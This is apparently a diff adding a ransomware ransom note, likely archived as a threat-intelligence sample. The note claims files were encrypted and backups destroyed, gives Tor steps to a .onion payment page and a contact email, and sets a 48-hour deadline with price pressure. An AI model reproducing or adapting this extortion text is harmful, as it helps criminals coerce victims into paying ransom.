@@ -1,0 +1,38 @@
+Your network has been penetrated.
+
+All files on each host in the network have been encrypted with a strong algorythm.
+
+Backups were either encrypted or deleted or backup disks were formatted.
+Shadow copies also removed, so F8 or any other methods may damage encrypted data but not recover.
+
+We exclusively have decryption software for your situation
+No decryption software is available in the public.
+
+	DO NOT RESET OR SHUTDOWN - files may be damaged.
+	DO NOT RENAME OR MOVE the encrypted and readme files.
+	DO NOT DELETE readme files.
+	DO NOT use any recovery software with restoring files overwriting encrypted.
+	This may lead to the impossibility of recovery of the certain files.
+
+
+To get info (decrypt your files) contact us at your personal page:
+
+	1. Download and install Tor Browser: https://www.torproject.org/download/
+	2. After a successful installation, run the browser and wait for initialization.
+	3. Type in the address bar:
+
+		http://q7wp5u55lhtuafjtsl6lkt24z4wvon2jexfzhzqqfrt3bqnpqboyqoid.onion/order/[snip]
+
+	4. Follow the instructions on the site
+	5. You should get in contact in 48 HOURS since your systems been infected.
+	6. The link above is valid for 7 days.
+	   After that period if you not get in contact
+	   your local data would be lost completely.
+	7. Questions? e-mail: btpsupport@protonmail.com
+	   If email not working - new one you can find on a tor page.
+
+
+The faster you get in contact - the lower price you can expect.
+
+DATA
+[snip]
